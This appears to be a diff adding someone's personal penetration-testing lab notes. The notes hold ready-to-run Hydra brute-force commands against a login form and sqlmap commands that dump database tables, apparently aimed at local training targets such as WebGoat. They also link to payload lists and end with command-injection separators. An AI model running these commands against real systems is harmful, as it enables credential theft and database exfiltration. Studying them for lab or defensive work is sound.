@@ -1,0 +1,52 @@
+--- START KALI LINUX AS DOCKER
+
+docker run --tty --interactive -v //c/Users/tomasz.janczewski/Desktop/www:/workdir kalilinux/kali-rolling
+
+--- UPDATE KALI
+apt update
+apt dist-upgrade
+apt autoremove
+apt clean
+apt install kali-tools-top10
+
+--- HYDRA 
+
+hydra 192.168.88.82 http-form-post "/login.php:user=^USER^&pass=^PASS^:Login Failed" -L ./user.lst -P ./password.lst -t 10 -w 30 -o hydra-http-post-attack.txt
+
+
+--- SQLMAP 
+
+sqlmap -u 'http://192.168.254.68:8080/get-int.php?id=1'
+sqlmap -u 'http://192.168.254.68:8080/get-int.php?id=1' --schema 
+sqlmap -h
+sqlmap -u 'http://192.168.254.68:8080/get-int.php?id=1' --schema -D docker
+sqlmap -u 'http://192.168.254.68:8080/get-int.php?id=1' --tables -D docker
+sqlmap -u 'http://192.168.254.68:8080/sqlmap.php' --method POST --data "user_id=aaa&user_pass=bbb"
+sqlmap -u 'http://192.168.254.68:8080/sqlmap.php' --method POST --data "user_id=aaa&user_pass=bbb" -D docker -T usier_login --dump
+sqlmap -u 'http://192.168.254.68:8080/sqlmap.php' --method POST --data "user_id=aaa&user_pass=bbb" -D docker --tables
+sqlmap -u 'http://192.168.254.68:8080/sqlmap.php' --method POST --data "user_id=aaa&user_pass=bbb" -D docker -T user --dump
+sqlmap -u 'http://192.168.254.68:8080/sqlmap.php' --method POST --data "user_id=aaa&user_pass=bbb" -D docker --dump-all
+
+--- URL
+https://hub.docker.com/r/webgoat/goatandwolf
+
+docker exec -it a919edb87092a10b15b45af48036a2c1d051ac0748477ca8f8edf4448337f987 /bin/bash
+
+https://github.com/payloadbox/sql-injection-payload-list
+
+https://github.com/parsiya/burp-sample-extension-java    - sample burp extension
+https://github.com/PortSwigger/burp-extensions-montoya-api-examples
+
+
+...HTML...
+<select nama="lang">
+<option value="pl">PL</select>
+...
+</select>
+
+
+ | ; ($(komenda))
+
+------------
+
+IN -> OUT
